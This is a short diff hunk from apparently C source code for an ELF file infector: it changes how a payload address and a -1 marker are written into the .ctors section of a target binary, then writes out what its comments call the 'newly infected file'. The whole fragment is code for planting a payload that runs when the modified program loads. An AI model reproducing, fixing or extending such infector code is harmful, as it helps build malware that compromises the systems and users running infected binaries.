@@ -145,8 +145,8 @@ int main(int argc, char *argv[]){
   }
 
   //add our payload to the ctors
-  *(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
-  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;
+  *(ELFN(Addr)*)(infected+ctors->sh_offset) = -1;
+  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = payloadMemory;
 
   //write out the newly infected file
   if( writeFile(argv[3], infected, infectedSize) != 0){
